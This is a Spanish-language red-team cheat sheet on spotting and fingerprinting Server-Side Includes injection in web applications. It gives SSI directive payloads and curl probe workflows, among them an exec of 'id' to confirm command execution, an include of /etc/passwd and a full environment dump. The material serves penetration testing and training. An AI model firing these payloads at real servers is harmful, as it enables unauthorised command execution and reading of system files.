---
aliases:
  - SSI Detection
  - SSI Recon
  - SSI Probe
tags:
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Detección y Reconocimiento

---

## Identificar SSI Habilitado

| **Indicador** | **Qué significa** | **Dónde mirar** |
|---|---|---|
| Extensión `.shtml` / `.shtm` / `.stm` | Handler SSI por defecto (Apache/IIS) | URL path |
| `Server: Apache` con `mod_include` | Stack Apache con SSI | Response headers |
| `Server: Microsoft-IIS` con SSI module | IIS con SSI | Response headers |
| `Options +Includes` / `AddHandler server-parsed` | SSI habilitado | `.htaccess` / vhost (si accesible) |
| MIME `text/x-server-parsed-html` | Contenido parseado por el server | Response `Content-Type` |
| Fecha auto-renderizada | `DATE_LOCAL` se procesa | Página muestra fecha sin JS |
| `.shtml` en directory listing / Wayback | URLs históricas o indexadas | Indexing / OSINT |
| CMS legacy / tutoriales educativos | Apps viejas suelen usar SSI | Recon contextual |

^ssi-detect-enabled

---

## Probes Iniciales

| **Payload** | **Qué confirma** | **Indicador** |
|---|---|---|
| `<!--#echo var="DATE_LOCAL" -->` | SSI activo | Renderiza la fecha |
| `<!--#echo var="DOCUMENT_NAME" -->` | SSI activo | Muestra el filename |
| `<!--#echo var="SERVER_SOFTWARE" -->` | Server + versión | `Apache/x.y` o `Microsoft-IIS/x.y` |
| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot | Path del filesystem |
| `<!--#config sizefmt="bytes" -->` | `#config` se procesa | Sin output visible (setea, no imprime) |
| `<!--#exec cmd="id" -->` | Capacidad de RCE | `uid=...` en la respuesta |
| `<!--#include virtual="/index.html" -->` | Capacidad de file read | Renderiza el incluido |

^ssi-detect-probes

> [!note] Un comentario HTML plano `<!-- -->` se ignora; `<!--#` se parsea → diferencial. Un directive inválido devuelve `[an error occurred while processing this directive]` → confirma que el parser está activo. Probá en form fields, params de URL y headers (`User-Agent`/`Referer`) si se loguean en un `.shtml`.

### Quick probe workflow

```bash
TARGET="https://target/page.shtml"

# Probe 1: Date
curl -s "$TARGET?q=<!--%23echo+var=%22DATE_LOCAL%22+-->" | grep -oE '[A-Z][a-z]+,\s+[0-9]+\s'
# If date renders → SSI active

# Probe 2: Server software
curl -s "$TARGET?q=<!--%23echo+var=%22SERVER_SOFTWARE%22+-->" | grep -oE 'Apache/[0-9.]+|Microsoft-IIS/[0-9.]+'

# Probe 3: Document root
curl -s "$TARGET?q=<!--%23echo+var=%22DOCUMENT_ROOT%22+-->"

# Probe 4: Confirm exec capability
curl -s "$TARGET?q=<!--%23exec+cmd=%22id%22+-->"
# If `uid=...` → RCE confirmed

# Probe 5: Confirm include
curl -s "$TARGET?q=<!--%23include+file=%22/etc/passwd%22+-->"
```

---

## Fingerprint del Server (Recon Profundo)

| **Payload** | **Info** | **Uso** |
|---|---|---|
| `<!--#echo var="SERVER_SOFTWARE" -->` | Versión completa del server | Lookup de CVEs |
| `<!--#echo var="SERVER_NAME" -->` | Hostname | Recon de red |
| `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot absoluto | Base para LFI/traversal |
| `<!--#echo var="SCRIPT_FILENAME" -->` | Path del `.shtml` actual | Layout del filesystem |
| `<!--#echo var="REMOTE_USER" -->` | Usuario de Basic Auth | Si hay auth HTTP |
| `<!--#echo var="HTTPS" -->` | Estado SSL (`on`/off) | Edge |
| `<!--#printenv -->` | Dump completo de env vars | Recon de una pasada |

^ssi-detect-fingerprint

### Workflow recon profundo

```html
<!-- Single payload — comprehensive recon -->
<table border=1>
<tr><td>Server</td><td><!--#echo var="SERVER_SOFTWARE" --></td></tr>
<tr><td>Doc Root</td><td><!--#echo var="DOCUMENT_ROOT" --></td></tr>
<tr><td>Script</td><td><!--#echo var="SCRIPT_FILENAME" --></td></tr>
<tr><td>HTTPS</td><td><!--#echo var="HTTPS" --></td></tr>
<tr><td>Date</td><td><!--#echo var="DATE_LOCAL" --></td></tr>
</table>

<!-- Or full dump -->
<!--#printenv -->
```

---
